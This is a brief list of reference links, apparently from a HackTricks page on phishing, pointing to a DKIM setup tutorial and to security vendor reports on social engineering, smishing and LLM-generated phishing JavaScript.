- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
